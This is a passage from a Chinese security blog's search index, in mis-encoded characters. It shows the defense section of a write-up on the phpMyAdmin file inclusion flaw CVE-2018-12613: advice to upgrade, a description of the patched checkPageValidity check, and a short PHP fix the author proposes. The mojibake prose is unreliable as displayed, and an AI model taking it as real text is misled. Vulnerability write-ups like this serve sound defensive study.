é˜²å¾¡</h2><p>ä»ç”¨æˆ·è§’åº¦æ¥çœ‹çš„è¯ï¼Œé‚£å°±æ˜¯å‡çº§ç‰ˆæœ¬ï¼Œæ²¡å¾—è¯´ã€‚</p><p>ä»å¼€å‘è€…è§’åº¦æ¥çœ‹ï¼Œç”±äºæœªèƒ½ç†è§£ä»–ä»¬å¯ä»¥å¤šæ¬¡ä¼ å‚çš„åˆè¡·ï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºåœ¨æ²¡æœ‰å¿…è¦çš„æƒ…å†µä¸‹å¯ä»¥å°†è¯¥åŠŸèƒ½åˆ é™¤ï¼Œåªä¿ç•™targetä¸€æ¬¡ä¼ å‚ï¼Œå³åªèƒ½åŒ…å«ç™½åå•å†…çš„æ–‡ä»¶ã€‚</p><p>è€Œåœ¨åç»­çš„ç‰ˆæœ¬ä¸­ä¹Ÿè¯å®äº†è¿™ä¸ªè§‚ç‚¹ï¼Œå¼€å‘äººå‘˜ç»™Coreçš„checkPageValidityæ–¹æ³•åŠ äº†ä¸€ä¸ªincludeå‚æ•°ï¼Œç”¨æ¥æ ‡å¿—æ˜¯å¦å¼€å¯è¿ç»­ä¼ å‚ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808538.png" alt="2020-09-29_13-12-08.png"></p><p>å½“includeå‚æ•°ä¸ºTrueæ—¶ï¼Œå³è¡¨ç¤ºä¸å…è®¸å¤šæ¬¡ä¼ å‚ã€‚<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808548.png" alt="2020-09-29_13-12-56.png"></p><p>PSï¼šæˆ‘æ€ä¹ˆjiaoçš„è¿™å—å¼€å‘äººå‘˜å†™é”™äº†å‘¢ğŸ¤¨ï¼Œåº”è¯¥æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="variable">$include</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±è¡¨ç¤ºä¼ å‚ä¸ºTrueæ—¶ï¼Œå¯ä»¥è¿ç»­ä¼ å‚åŒ…å«ï¼Œä¼ å‚ä¸ºFalseæ—¶ä¸å…è®¸ï¼Œè¿™ä¹Ÿå’Œ$includeçš„åˆå§‹å€¼ç›¸å¯¹åº”ã€‚</p><p>éšä¾¿æƒ³æƒ³~</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2018-12613 </tag>
            
            <tag> phpmyadminä»»æ„æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
